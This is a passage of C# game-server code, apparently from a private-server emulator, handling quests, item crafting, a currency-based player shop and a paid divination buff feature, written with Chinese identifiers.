						任务提示(任务ID, 21, 1);
						更新人物任务();
						break;
					case 1003:
						灵兽转职业(1, 2);
						人物灵兽.计算基本数据();
						更新灵兽HP_MP_SP();
						更新灵兽武功和状态();
						更新灵兽负重();
						召唤更新显示已装备物品(this);
						任务提示(任务ID, 21, 1);
						更新人物任务();
						break;
					case 1004:
						灵兽转职业(2, 2);
						人物灵兽.计算基本数据();
						更新灵兽HP_MP_SP();
						更新灵兽武功和状态();
						更新灵兽负重();
						召唤更新显示已装备物品(this);
						任务提示(任务ID, 21, 1);
						更新人物任务();
						break;
					case 1005:
						灵兽转职业(1, 3);
						人物灵兽.计算基本数据();
						更新灵兽HP_MP_SP();
						更新灵兽武功和状态();
						更新灵兽负重();
						召唤更新显示已装备物品(this);
						任务提示(任务ID, 21, 1);
						更新人物任务();
						break;
					case 1006:
						灵兽转职业(2, 3);
						人物灵兽.计算基本数据();
						更新灵兽HP_MP_SP();
						更新灵兽武功和状态();
						更新灵兽负重();
						召唤更新显示已装备物品(this);
						任务提示(任务ID, 21, 1);
						更新人物任务();
						break;
					case 178:
						人物转职业(base.Player_Zx, 5);
						if (BitConverter.ToInt16(气功[10].气功_byte, 0) == 255)
						{
							气功[10] = new 气功类(new byte[2]);
							气功[10].气功ID = 得到气功ID(10, base.Player_Job);
							气功[10].气功量 = 0;
						}
						初始化气功();
						学习技能(0, 25);
						学习技能(0, 26);
						学习技能(0, 27);
						更新武功和状态();
						break;
					}
					if (value.任务类型 == 1)
					{
						value.任务阶段[任务阶段ID - 2].阶段状态 = 0;
					}
					else
					{
						value.任务阶段ID = 任务阶段ID - 1;
						value.任务阶段[任务阶段ID - 1].阶段状态 = 1;
					}
				}
				else
				{
					value.任务阶段[任务阶段ID - 1].阶段状态 = 1;
				}
			}
			else
			{
				任务类 rW = new 任务类().GetRW(任务ID);
				rW.任务ID = 任务ID;
				rW.RwID = 任务ID;
				rW.任务阶段ID = 任务阶段ID;
				if (rW.任务阶段数量 == 0)
				{
					保存人物数据存储过程();
				}
				else
				{
					rW.任务阶段[任务阶段ID].阶段状态 = 1;
					任务.Add(任务ID, rW);
				}
			}
			更新人物任务();
		}

		public bool 检查任务物品数量(int 物品ID, int 物品数量)
		{
			int num = 0;
			while (true)
			{
				if (num < 36)
				{
					if (任务物品[num].物品ID == 物品ID && 任务物品[num].物品数量 == 物品数量)
					{
						break;
					}
					num++;
					continue;
				}
				return false;
			}
			return true;
		}

		public void del任务物品(int 物品ID, int 物品数量)
		{
			ItmeClass value;
			if (物品数量 <= 0 || !World.Itme.TryGetValue(物品ID, out value))
			{
				return;
			}
			if (value.FLD_QUESTITEM == 1)
			{
				int num = 0;
				while (true)
				{
					if (num < 36)
					{
						if (任务物品[num].物品ID == 物品ID)
						{
							break;
						}
						num++;
						continue;
					}
					return;
				}
				if (任务物品[num].物品数量 == 物品数量)
				{
					任务物品[num] = new 任务物品类(new byte[8]);
				}
				else
				{
					任务物品[num].物品数量 -= 物品数量;
				}
				发送任务物品列表();
				return;
			}
			switch (物品ID)
			{
			case 909000001:
				base.人物经验 -= 物品数量;
				计算人物基本数据3();
				更新经验和历练();
				return;
			case 909000002:
				base.Player_ExpErience -= 物品数量;
				更新经验和历练();
				return;
			case 909000004:
				base.Player_Money -= (uint)物品数量;
				得到钱的提示((uint)物品数量);
				更新金钱和负重();
				return;
			case 909000005:
				base.Player_WuXun -= 物品数量;
				更新武功和状态();
				return;
			}
			物品类[] 装备栏包裹 = base.装备栏包裹;
			foreach (物品类 物品类 in 装备栏包裹)
			{
				if (物品类.Get物品ID == 物品ID)
				{
					物品使用(1, 物品类.物品位置, 物品数量);
				}
			}
		}

		public void 更新人物任务()
		{
			using (发包类 发包类 = new 发包类())
			{
				发包类.Write4(任务.Count);
				foreach (任务类 value in 任务.Values)
				{
					发包类.Write2(value.任务ID);
					发包类.Write2(value.任务阶段ID);
				}
				发包类.Write4(0);
				if (base.Client != null)
				{
					base.Client.SendPak(发包类, 34048, base.人物全服ID);
				}
			}
		}

		public void 更新人物任务2(int pid)
		{
			using (发包类 发包类 = new 发包类())
			{
				发包类.Write4(任务.Count);
				foreach (任务类 value in 任务.Values)
				{
					发包类.Write2(value.任务ID);
					if (value.任务ID == pid)
					{
						发包类.Write2(value.任务阶段ID);
					}
					else if (value.任务阶段ID == 0)
					{
						发包类.Write2(1);
					}
					else
					{
						发包类.Write2(value.任务阶段ID);
					}
				}
				发包类.Write4(0);
				if (base.Client != null)
				{
					base.Client.SendPak(发包类, 34048, base.人物全服ID);
				}
			}
		}

		private void 道具组合(byte[] 封包数据, int 封包大小)
		{
			int num = BitConverter.ToInt32(封包数据, 14);
			int num2 = BitConverter.ToInt32(封包数据, 22);
			switch (num)
			{
			case 1000000773:
			{
				int num8 = 0;
				for (int l = 0; l < 66; l++)
				{
					if (BitConverter.ToInt32(装备栏包裹[l].物品ID, 0) == 1000000772 && BitConverter.ToInt32(装备栏包裹[l].物品数量, 0) >= 2 * num2)
					{
						num8 = 1;
						break;
					}
				}
				if (num8 == 0)
				{
					道具组合提示(3, num, num2);
					break;
				}
				int num9 = 得到包裹空位(this);
				if (num9 == -1)
				{
					道具组合提示(4, num, num2);
					break;
				}
				for (int m = 0; m < 66; m++)
				{
					if (BitConverter.ToInt32(装备栏包裹[m].物品ID, 0) == 1000000772)
					{
						减去物品(m, 2 * num2);
					}
				}
				增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(num), num9, BitConverter.GetBytes(num2), new byte[56]);
				道具组合提示(1, num, num2);
				break;
			}
			case 1000000772:
			{
				int num6 = 0;
				物品类 物品类 = 得到包裹物品(1000000771);
				if (物品类 != null && BitConverter.ToInt32(物品类.物品数量, 0) >= 3 * num2)
				{
					num6 = 1;
				}
				if (num6 == 0)
				{
					道具组合提示(3, num, num2);
					break;
				}
				int num7 = 得到包裹空位(this);
				if (num7 == -1)
				{
					道具组合提示(4, num, num2);
					break;
				}
				减去物品(物品类.物品位置, 3 * num2);
				增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(num), num7, BitConverter.GetBytes(num2), new byte[56]);
				道具组合提示(1, num, num2);
				break;
			}
			case 800000047:
			{
				int num3 = 0;
				int num4 = 0;
				for (int i = 0; i < 66; i++)
				{
					if (BitConverter.ToInt32(装备栏包裹[i].物品ID, 0) == 800000046)
					{
						num3 += BitConverter.ToInt32(装备栏包裹[i].物品数量, 0);
					}
					else if (BitConverter.ToInt32(装备栏包裹[i].物品ID, 0) == 1000000771 && BitConverter.ToInt32(装备栏包裹[i].物品数量, 0) >= 10 * num2)
					{
						num4 = 1;
					}
				}
				if (num3 >= 5 * num2 && num4 != 0)
				{
					if (得到包裹空位数() < num2)
					{
						道具组合提示(4, num, num2);
						break;
					}
					int num5 = 5 * num2;
					for (int j = 0; j < 66; j++)
					{
						if (BitConverter.ToInt32(装备栏包裹[j].物品ID, 0) == 800000046)
						{
							if (num5 > 0)
							{
								减去物品(j, 1);
								num5--;
							}
						}
						else if (BitConverter.ToInt32(装备栏包裹[j].物品ID, 0) == 1000000771)
						{
							减去物品(j, 10 * num2);
						}
					}
					for (int k = 0; k < num2; k++)
					{
						int 位置 = 得到包裹空位(this);
						byte[] bytes = BitConverter.GetBytes(RxjhClass.GetDBItmeId());
						byte[] array = new byte[56];
						System.Buffer.BlockCopy(BitConverter.GetBytes(RNG.Next(23, 51)), 0, array, 0, 4);
						增加物品2(bytes, BitConverter.GetBytes(num), 位置, BitConverter.GetBytes(1), array);
					}
					道具组合提示(1, num, num2);
				}
				else
				{
					道具组合提示(3, num, num2);
				}
				break;
			}
			}
		}

		private void 道具组合提示(int 提示ID, int 物品ID, int 物品数量)
		{
			发包类 发包类 = new 发包类();
			发包类.Write2(11);
			发包类.Write2(提示ID);
			发包类.Write8(物品ID);
			发包类.Write4(物品数量);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 793, base.人物全服ID);
			}
		}

		private void 元宝个人商店(byte[] data, int length)
		{
			switch (data[10])
			{
			case 1:
			{
				byte[] array3 = new byte[BitConverter.ToUInt16(data, 11)];
				System.Buffer.BlockCopy(data, 13, array3, 0, array3.Length);
				string text = Encoding.Default.GetString(array3).Replace("\0", string.Empty).Trim();
				if (打开仓库中)
				{
					元宝个人商店功能包(1, 11, text, null);
				}
				else if (text.Length >= 2 && text.Length <= 16)
				{
					if (base.Player_Level <= 20)
					{
						元宝个人商店功能包(1, 13, text, null);
						break;
					}
					元宝个人商店功能包(1, 1, text, null);
					打开仓库中 = true;
					个人商店 = new 个人商店类();
					个人商店.商店名 = array3;
					个人商店.商店类型 = 2;
				}
				else
				{
					元宝个人商店功能包(1, 12, text, null);
				}
				break;
			}
			case 2:
			{
				byte[] dst = new byte[4];
				byte[] dst2 = new byte[8];
				byte[] array = new byte[8];
				byte[] array2 = new byte[4];
				System.Buffer.BlockCopy(data, 11, dst, 0, 4);
				System.Buffer.BlockCopy(data, 19, dst2, 0, 8);
				System.Buffer.BlockCopy(data, 27, array2, 0, 2);
				System.Buffer.BlockCopy(data, 31, array, 0, 8);
				int num = BitConverter.ToInt16(data, 29);
				if (BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) == 0)
				{
					元宝个人商店功能包(2, 21, null, null);
					break;
				}
				if (BitConverter.ToInt32(array2, 0) <= 0)
				{
					元宝个人商店功能包(2, 22, null, null);
					break;
				}
				if (BitConverter.ToInt32(array2, 0) > 9999)
				{
					元宝个人商店功能包(2, 23, null, null);
					break;
				}
				if (BitConverter.ToInt32(array, 0) <= 0)
				{
					元宝个人商店功能包(2, 24, null, null);
					break;
				}
				if (BitConverter.ToInt32(array, 0) > 100000)
				{
					元宝个人商店功能包(2, 25, null, null);
					break;
				}
				if (个人商店.商店物品列表.Count >= 8)
				{
					元宝个人商店功能包(2, 26, null, null);
					break;
				}
				if (BitConverter.ToInt32(装备栏包裹[num].物品数量, 0) < BitConverter.ToInt32(array2, 0))
				{
					元宝个人商店功能包(2, 27, null, null);
					break;
				}
				if (装备栏包裹[num].物品绑定)
				{
					元宝个人商店功能包(2, 27, null, null);
					break;
				}
				个人商店物品类 value;
				if (个人商店.商店物品列表.TryGetValue(BitConverter.ToInt64(装备栏包裹[num].物品全局ID, 0), out value))
				{
					元宝个人商店功能包(2, 27, null, null);
					break;
				}
				个人商店物品类 个人商店物品类 = new 个人商店物品类();
				个人商店物品类.数量 = BitConverter.ToInt32(array2, 0);
				个人商店物品类.价格 = BitConverter.ToInt32(array, 0);
				个人商店物品类.位置 = num;
				个人商店物品类.物品 = 装备栏包裹[num];
				个人商店.商店物品列表.Add(BitConverter.ToInt64(装备栏包裹[num].物品全局ID, 0), 个人商店物品类);
				元宝个人商店功能包(2, 2, null, 个人商店物品类);
				break;
			}
			case 3:
				元宝个人商店功能包(3, 3, null, null);
				个人商店显示包(3, base.人物全服ID, 个人商店.商店名);
				个人商店.个人商店是否开启 = true;
				break;
			case 4:
				元宝个人商店关店();
				break;
			case 5:
				if (元宝个人商店是否开通 == 0)
				{
					元宝个人商店查询是否开通包(0);
				}
				else if (元宝个人商店是否开通 == 1)
				{
					元宝个人商店查询是否开通包(1);
				}
				break;
			}
		}

		private void 元宝个人商店关店()
		{
			if (个人商店 != null)
			{
				打开仓库中 = false;
				元宝个人商店功能包(4, 4, null, null);
				个人商店显示包(4, base.人物全服ID, null);
				if (个人商店.进入人 != null)
				{
					个人商店.进入人.进店中 = false;
					个人商店.进入人.打开仓库中 = false;
					个人商店.进入人.进店中ID = 0;
					个人商店.进入人.进元宝个人商店功能包(3, 3, base.人物全服ID, 个人商店.进入人.人物全服ID, null, null);
				}
				个人商店.个人商店是否开启 = false;
				个人商店.商店物品列表.Clear();
				个人商店.Dispose();
				个人商店.进入人 = null;
				个人商店 = null;
			}
			else
			{
				if (!进店中 || 进店中ID == 0)
				{
					return;
				}
				Players players = 得到人物数据(进店中ID);
				if (players != null && players.个人商店 != null)
				{
					if (players.个人商店.商店类型 == 1)
					{
						出店(进店中ID);
					}
					else if (players.个人商店.商店类型 == 2)
					{
						元宝个人商店出店(进店中ID);
					}
				}
			}
		}

		private void 进元宝个人商店(byte[] data, int length)
		{
			封包修改(data, length);
			int num = BitConverter.ToInt32(data, 11);
			switch (data[10])
			{
			case 4:
				break;
			case 1:
				try
				{
					if (打开仓库中)
					{
						进元宝个人商店功能包(1, 14, num, 0, null, null);
					}
					else
					{
						Players players2 = 得到人物数据(num);
						if (players2 != null && players2.个人商店 != null && players2.个人商店.个人商店是否开启)
						{
							if (!查找范围玩家(40, players2))
							{
								进元宝个人商店功能包(1, 12, num, 0, null, null);
							}
							else if (players2.个人商店.个人商店是否使用中)
							{
								进元宝个人商店功能包(1, 13, num, 0, null, null);
							}
							else
							{
								players2.个人商店.个人商店是否使用中 = true;
								players2.个人商店.进入人 = this;
								进店中 = true;
								进店中ID = num;
								打开仓库中 = true;
								进元宝个人商店功能包(1, 1, players2.人物全服ID, 0, players2.个人商店.商店名, players2.个人商店.商店物品列表);
								players2.进元宝个人商店功能包(1, 1, players2.人物全服ID, base.人物全服ID, null, null);
							}
						}
					}
				}
				catch (Exception ex3)
				{
					Form1.WriteLine(1, "进元宝个人商店  1  出错" + base.Client.WorldId + "|" + base.Client.ToString() + "  " + ((ex3 != null) ? ex3.ToString() : null));
				}
				break;
			case 2:
				try
				{
					int num2 = BitConverter.ToInt32(data, 15);
					long num3 = BitConverter.ToInt64(data, 23);
					int num4 = BitConverter.ToInt16(data, 31);
					Players players = 得到人物数据(num);
					个人商店物品类 value;
					if (players != null && players.打开仓库中 && players.个人商店.商店物品列表.TryGetValue(num3, out value))
					{
						int num5 = 得到包裹空位(this);
						if (num5 == -1)
						{
							进元宝个人商店功能包(2, 24, num, 0, null, null);
						}
						else if (num4 > value.物品.Get物品数量)
						{
							进元宝个人商店功能包(2, 21, num, 0, null, null);
						}
						else if (BitConverter.ToInt32(players.装备栏包裹[value.位置].物品ID, 0) == 0)
						{
							进元宝个人商店功能包(2, 21, num, 0, null, null);
						}
						else if (BitConverter.ToInt64(players.装备栏包裹[value.位置].物品全局ID, 0) != num3)
						{
							进元宝个人商店功能包(2, 21, num, 0, null, null);
						}
						else if (BitConverter.ToInt32(players.装备栏包裹[value.位置].物品ID, 0) != num2)
						{
							进元宝个人商店功能包(2, 21, num, 0, null, null);
						}
						else if (num3 == 0L)
						{
							进元宝个人商店功能包(2, 21, num, 0, null, null);
						}
						else if (base.FLD_RXPIONT < value.价格 * num4)
						{
							进元宝个人商店功能包(2, 22, num, 0, null, null);
						}
						else
						{
							物品类 物品类 = 得到人物物品物品全局ID(players, num3);
							if (物品类 != null)
							{
								if (BitConverter.ToInt32(物品类.物品数量, 0) < value.数量)
								{
									Form1.WriteLine(6, "非法复制_元宝个人商店_进店1[" + base.Userid + "]-[" + base.UserName + "]物品名称[" + 物品类.得到物品名称() + "]  物品数量[" + BitConverter.ToInt32(物品类.物品数量, 0) + "]  数量[" + value.数量 + "]");
								}
								else if (World.Itme[BitConverter.ToInt32(物品类.物品ID, 0)].FLD_SIDE == 0 && BitConverter.ToInt32(物品类.物品数量, 0) > 1)
								{
									Form1.WriteLine(6, "非法复制_元宝个人商店_进店2[" + base.Userid + "]-[" + base.UserName + "]物品名称[" + 物品类.得到物品名称() + "]  物品数量[" + BitConverter.ToInt32(物品类.物品数量, 0) + "]  数量[" + value.数量 + "]");
								}
								else
								{
									Form1.WriteLine(5, "[" + players.Userid + "][" + players.UserName + "]  元宝个人商店买出物品  :[" + base.Userid + "][" + base.UserName + "]  (物品:" + 物品类.得到物品名称() + "/编号:" + BitConverter.ToInt32(物品类.得到全局ID(), 0) + "属性:[" + 物品类.FLD_MAGIC0 + "," + 物品类.FLD_MAGIC1 + "," + 物品类.FLD_MAGIC2 + "," + 物品类.FLD_MAGIC3 + "," + 物品类.FLD_MAGIC4 + "]  价格[" + value.价格 + "]");
									players.检察元宝数据((int)(value.价格 * num4), 1);
									检察元宝数据((int)(value.价格 * num4), 0);
									string userid = players.Userid;
									string userName = players.UserName;
									string userid2 = base.Userid;
									string userName2 = base.UserName;
									double double_ = BitConverter.ToInt64(物品类.物品全局ID, 0);
									int int_ = BitConverter.ToInt32(物品类.物品ID, 0);
									string string_ = 物品类.得到物品名称();
									int int_2 = num4;
									string string_2 = 物品类.FLD_MAGIC0 + "-" + 物品类.FLD_MAGIC1 + "-" + 物品类.FLD_MAGIC2 + "-" + 物品类.FLD_MAGIC3 + "-" + 物品类.FLD_MAGIC4 + "初" + 物品类.FLD_FJ_觉醒 + "中" + 物品类.FLD_FJ_中级附魂 + "进" + 物品类.FLD_FJ_进化;
									int int_3 = (int)(value.价格 * num4);
									RxjhClass.物品记录(userid, userName, userid2, userName2, double_, int_, string_, int_2, string_2, int_3, "元宝商店");
									发包类 发包类 = new 发包类();
									发包类.Write(2);
									发包类.Write(2);
									发包类.Write4(num);
									发包类.Write8(value.物品.Get物品ID);
									发包类.Write8(num3);
									发包类.Write2(num4);
									发包类.Write2(value.位置);
									发包类.Write8(value.价格);
									发包类.Write4(value.物品.FLD_MAGIC0);
									发包类.Write4(value.物品.FLD_MAGIC1);
									发包类.Write4(value.物品.FLD_MAGIC2);
									发包类.Write4(value.物品.FLD_MAGIC3);
									发包类.Write4(value.物品.FLD_MAGIC4);
									发包类.Write2(value.物品.FLD_FJ_MAGIC0);
									发包类.Write2(value.物品.FLD_FJ_MAGIC1);
									发包类.Write2(value.物品.FLD_FJ_中级附魂);
									发包类.Write2(value.物品.FLD_FJ_MAGIC2);
									发包类.Write2(value.物品.FLD_FJ_MAGIC3);
									发包类.Write2(value.物品.FLD_FJ_MAGIC4);
									发包类.Write2(value.物品.FLD_FJ_MAGIC5);
									发包类.Write2(0);
									发包类.Write4(value.物品.FLD_KSSJ);
									发包类.Write4(value.物品.FLD_JSSJ);
									发包类.Write2(value.物品.FLD_FJ_NJ);
									发包类.Write4(value.物品.FLD_FJ_觉醒);
									发包类.Write2(0);
									发包类.Write2(value.物品.FLD_FJ_进化);
									发包类.Write2(0);
									发包类.Write8(num3);
									if (base.Client != null)
									{
										base.Client.SendPak(发包类, 3868, base.人物全服ID);
									}
									if (players.Client != null)
									{
										players.Client.SendPak(发包类, 3868, base.人物全服ID);
									}
									增加物品(物品类.物品全局ID, 物品类.物品ID, num5, BitConverter.GetBytes(num4), 物品类.物品属性);
									players.减去物品(物品类.物品位置, num4);
									if (value.数量 - num4 > 0)
									{
										value.数量 -= num4;
									}
									else
									{
										players.个人商店.商店物品列表.Remove(num3);
									}
									保存元宝数据();
									players.保存元宝数据();
									if (players.个人商店.商店物品列表.Count == 0)
									{
										players.元宝个人商店关店();
									}
								}
							}
							else
							{
								进元宝个人商店功能包(2, 21, num, 0, null, null);
							}
						}
					}
				}
				catch (Exception ex2)
				{
					Form1.WriteLine(1, "进元宝个人商店  2  出错" + base.Client.WorldId + "|" + base.Client.ToString() + "  " + ((ex2 != null) ? ex2.ToString() : null));
				}
				break;
			case 3:
				try
				{
					元宝个人商店出店(num);
				}
				catch (Exception ex)
				{
					Form1.WriteLine(1, "进元宝个人商店  3  出错" + base.Client.WorldId + "|" + base.Client.ToString() + "  " + ((ex != null) ? ex.ToString() : null));
				}
				break;
			case 5:
				if (元宝个人商店是否开通 == 0)
				{
					元宝个人商店查询是否开通包(0);
				}
				else if (元宝个人商店是否开通 == 1)
				{
					元宝个人商店查询是否开通包(1);
				}
				break;
			}
		}

		private void 元宝个人商店出店(int 人物ID)
		{
			进店中 = false;
			打开仓库中 = false;
			进店中ID = 0;
			进元宝个人商店功能包(3, 3, 人物ID, base.人物全服ID, null, null);
			Players players = 得到人物数据(人物ID);
			if (players != null && players.个人商店 != null)
			{
				players.个人商店.个人商店是否使用中 = false;
				players.个人商店.进入人 = null;
				players.进元宝个人商店功能包(3, 3, players.人物全服ID, base.人物全服ID, null, null);
			}
		}

		private void 个人商店显示包(int 功能ID, int 人物ID, byte[] 商店名)
		{
			发包类 发包类 = new 发包类();
			发包类.Write4(1);
			发包类.Write4(人物ID);
			if (功能ID == 3)
			{
				发包类.Write4(人物ID);
			}
			else
			{
				发包类.Write4(uint.MaxValue);
			}
			if (商店名 != null)
			{
				发包类.Write2((byte)商店名.Length);
				发包类.Write(商店名, 0, 商店名.Length);
			}
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 2588, base.人物全服ID);
			}
			发送当前范围广播数据(发包类, 2588, base.人物全服ID);
		}

		private void 元宝个人商店功能包(int 功能ID, int ID说明, string 商店名, 个人商店物品类 物品)
		{
			发包类 发包类 = new 发包类();
			发包类.Write(功能ID);
			发包类.Write(ID说明);
			if (商店名 != null)
			{
				发包类.WriteAsciiFixed(商店名);
			}
			if (物品 != null)
			{
				发包类.Write8(物品.物品.Get物品ID);
				发包类.Write8(物品.物品.Get物品全局ID);
				发包类.Write2(物品.数量);
				发包类.Write2(物品.位置);
				发包类.Write8(物品.价格);
				发包类.Write4(物品.物品.FLD_MAGIC0);
				发包类.Write4(物品.物品.FLD_MAGIC1);
				发包类.Write4(物品.物品.FLD_MAGIC2);
				发包类.Write4(物品.物品.FLD_MAGIC3);
				发包类.Write4(物品.物品.FLD_MAGIC4);
				发包类.Write2(物品.物品.FLD_FJ_MAGIC0);
				发包类.Write2(物品.物品.FLD_FJ_MAGIC1);
				发包类.Write2(物品.物品.FLD_FJ_中级附魂);
				发包类.Write2(物品.物品.FLD_FJ_MAGIC2);
				发包类.Write2(物品.物品.FLD_FJ_MAGIC3);
				发包类.Write2(物品.物品.FLD_FJ_MAGIC4);
				发包类.Write2(物品.物品.FLD_FJ_MAGIC5);
				发包类.Write2(0);
				发包类.Write(物品.物品.FLD_KSSJ);
				发包类.Write(物品.物品.FLD_JSSJ);
				发包类.Write2(物品.物品.FLD_FJ_NJ);
				发包类.Write4(物品.物品.FLD_FJ_觉醒);
				发包类.Write2(0);
				发包类.Write2(物品.物品.FLD_FJ_进化);
				发包类.Write2(0);
			}
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 3100, base.人物全服ID);
			}
		}

		private void 进元宝个人商店功能包(int 功能ID, int ID说明, int 人物ID, int 人物ID2, byte[] 商店名, ThreadSafeDictionary<long, 个人商店物品类> 物品)
		{
			发包类 发包类 = new 发包类();
			发包类.Write(功能ID);
			发包类.Write(ID说明);
			发包类.Write4(人物ID);
			if (功能ID != ID说明)
			{
				发包类.Write(1);
			}
			if (商店名 != null)
			{
				发包类.Write2(商店名.Length);
				发包类.Write(商店名, 0, 商店名.Length);
				if (物品 != null)
				{
					发包类.Write2(物品.Count);
					foreach (个人商店物品类 value in 物品.Values)
					{
						发包类.Write8(value.物品.Get物品ID);
						发包类.Write8(value.物品.Get物品全局ID);
						发包类.Write2(value.数量);
						发包类.Write2(value.位置);
						发包类.Write8(value.价格);
						发包类.Write4(value.物品.FLD_MAGIC0);
						发包类.Write4(value.物品.FLD_MAGIC1);
						发包类.Write4(value.物品.FLD_MAGIC2);
						发包类.Write4(value.物品.FLD_MAGIC3);
						发包类.Write4(value.物品.FLD_MAGIC4);
						发包类.Write2(value.物品.FLD_FJ_MAGIC0);
						发包类.Write2(value.物品.FLD_FJ_MAGIC1);
						发包类.Write2(value.物品.FLD_FJ_中级附魂);
						发包类.Write2(value.物品.FLD_FJ_MAGIC2);
						发包类.Write2(value.物品.FLD_FJ_MAGIC3);
						发包类.Write2(value.物品.FLD_FJ_MAGIC4);
						发包类.Write2(value.物品.FLD_FJ_MAGIC5);
						发包类.Write2(0);
						发包类.Write4(value.物品.FLD_KSSJ);
						发包类.Write4(value.物品.FLD_JSSJ);
						发包类.Write2(value.物品.FLD_FJ_NJ);
						发包类.Write4(value.物品.FLD_FJ_觉醒);
						发包类.Write2(0);
						发包类.Write2(value.物品.FLD_FJ_进化);
						发包类.Write2(0);
					}
				}
			}
			else if (功能ID == ID说明)
			{
				发包类.Write4(人物ID2);
			}
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 3868, base.人物全服ID);
			}
		}

		private void 元宝个人商店查询是否开通包(int id)
		{
			发包类 发包类 = new 发包类();
			发包类.Write4(id);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 12316, base.人物全服ID);
			}
		}

		private void 元宝个人商店查询包(int id)
		{
			发包类 发包类 = new 发包类();
			发包类.Write4(id);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 50200, base.人物全服ID);
			}
		}

		private void 元宝个人商店查询协议(byte[] data, int length)
		{
			元宝个人商店协议包(1);
		}

		private void 元宝个人商店查询协议开通(byte[] data, int length)
		{
			元宝个人商店是否开通 = 1;
			发包类 发包类 = new 发包类();
			发包类.Write4(1);
			发包类.Write4(base.FLD_RXPIONT);
			发包类.Write4(25);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 6428, base.人物全服ID);
			}
		}

		private void 元宝个人商店协议包(int id)
		{
			元宝个人商店查询包(1);
			查百宝阁元宝数();
			元宝个人商店查询包(0);
			发包类 发包类 = new 发包类();
			发包类.Write4(id);
			发包类.Write4(base.FLD_RXPIONT);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 5660, base.人物全服ID);
			}
		}

		public string cc(int a)
		{
			string result = "无";
			switch (a)
			{
			case 0:
				result = "剪刀";
				break;
			case 1:
				result = "石头";
				break;
			case 2:
				result = "布";
				break;
			}
			return result;
		}

		public string bb(int a)
		{
			string result = "无";
			switch (a)
			{
			case 0:
				result = "平局";
				break;
			case 1:
				result = "赢";
				break;
			case 2:
				result = "输";
				break;
			}
			return result;
		}

		public void 石头剪子布(byte[] 封包数据, int 封包大小)
		{
			try
			{
				int num = BitConverter.ToInt16(封包数据, 10);
				int num2 = BitConverter.ToInt16(封包数据, 14);
				switch (num)
				{
				case 1:
				{
					Random random = new Random(DateTime.Now.Millisecond);
					int id2 = random.Next(10001, 10101);
					if (num2 != 1)
					{
						石头剪子布提示(num, 1, id2, 0);
					}
					if (num2 == 1)
					{
						查百宝阁元宝数();
						if (base.FLD_RXPIONT >= World.占卜费用)
						{
							查百宝阁元宝数();
							检察元宝数据(World.占卜费用, 0);
							保存元宝数据();
							系统提示("占卜成功领取BUF,收取" + World.占卜费用 + "元宝", 9, "占卜提示");
							switch (random.Next(1000000408, 1000000414))
							{
							case 1000000408:
							{
								if (追加状态列表.ContainsKey(1000000408))
								{
									追加状态列表[1000000408].时间结束事件();
								}
								if (追加状态列表.ContainsKey(1000000412))
								{
									追加状态列表[1000000412].时间结束事件();
								}
								追加状态类 追加状态类2 = new 追加状态类(this, 900000, 1000000408, 1);
								追加状态列表.Add(追加状态类2.FLD_PID, 追加状态类2);
								状态效果(BitConverter.GetBytes(追加状态类2.FLD_PID), 1, 900000);
								addFLD_追加百分比_攻击(0.1);
								更新武功和状态();
								更新广播人物数据();
								更新人物数据(this);
								break;
							}
							case 1000000409:
							{
								if (追加状态列表.ContainsKey(1000000409))
								{
									追加状态列表[1000000409].时间结束事件();
								}
								追加状态类 追加状态类3 = new 追加状态类(this, 900000, 1000000409, 1);
								追加状态列表.Add(追加状态类3.FLD_PID, 追加状态类3);
								状态效果(BitConverter.GetBytes(追加状态类3.FLD_PID), 1, 900000);
								base.人物追加最大_HP += 500;
								更新HP_MP_SP();
								更新武功和状态();
								更新广播人物数据();
								更新人物数据(this);
								break;
							}
							case 1000000410:
							{
								if (追加状态列表.ContainsKey(1000000410))
								{
									追加状态列表[1000000410].时间结束事件();
								}
								追加状态类 追加状态类5 = new 追加状态类(this, 900000, 1000000410, 1);
								追加状态列表.Add(追加状态类5.FLD_PID, 追加状态类5);
								状态效果(BitConverter.GetBytes(追加状态类5.FLD_PID), 1, 900000);
								base.人物追加最大_MP += 500;
								更新HP_MP_SP();
								更新武功和状态();
								更新广播人物数据();
								更新人物数据(this);
								break;
							}
							case 1000000411:
							{
								if (追加状态列表.ContainsKey(1000000411))
								{
									追加状态列表[1000000411].时间结束事件();
								}
								if (追加状态列表.ContainsKey(1000000413))
								{
									追加状态列表[1000000413].时间结束事件();
								}
								追加状态类 追加状态类6 = new 追加状态类(this, 900000, 1000000411, 1);
								追加状态列表.Add(追加状态类6.FLD_PID, 追加状态类6);
								状态效果(BitConverter.GetBytes(追加状态类6.FLD_PID), 1, 900000);
								addFLD_追加百分比_防御(0.1);
								更新武功和状态();
								更新广播人物数据();
								更新人物数据(this);
								break;
							}
							case 1000000412:
							{
								if (追加状态列表.ContainsKey(1000000412))
								{
									追加状态列表[1000000412].时间结束事件();
								}
								追加状态类 追加状态类7 = new 追加状态类(this, 900000, 1000000412, 1);
								追加状态列表.Add(追加状态类7.FLD_PID, 追加状态类7);
								状态效果(BitConverter.GetBytes(追加状态类7.FLD_PID), 1, 900000);
								addFLD_追加百分比_攻击(0.05);
								更新武功和状态();
								更新广播人物数据();
								更新人物数据(this);
								break;
							}
							case 1000000413:
							{
								if (追加状态列表.ContainsKey(1000000413))
								{
									追加状态列表[1000000413].时间结束事件();
								}
								追加状态类 追加状态类4 = new 追加状态类(this, 900000, 1000000413, 1);
								追加状态列表.Add(追加状态类4.FLD_PID, 追加状态类4);
								状态效果(BitConverter.GetBytes(追加状态类4.FLD_PID), 1, 900000);
								addFLD_追加百分比_防御(0.05);
								更新武功和状态();
								更新广播人物数据();
								更新人物数据(this);
								break;
							}
							case 1000000414:
							{
								if (追加状态列表.ContainsKey(1000000414))
								{
									追加状态列表[1000000414].时间结束事件();
								}
								追加状态类 追加状态类 = new 追加状态类(this, 900000, 1000000414, 1);
								追加状态列表.Add(追加状态类.FLD_PID, 追加状态类);
								状态效果(BitConverter.GetBytes(追加状态类.FLD_PID), 1, 900000);
								base.FLD_人物_追加百分比_回避 += 0.05;
								更新武功和状态();
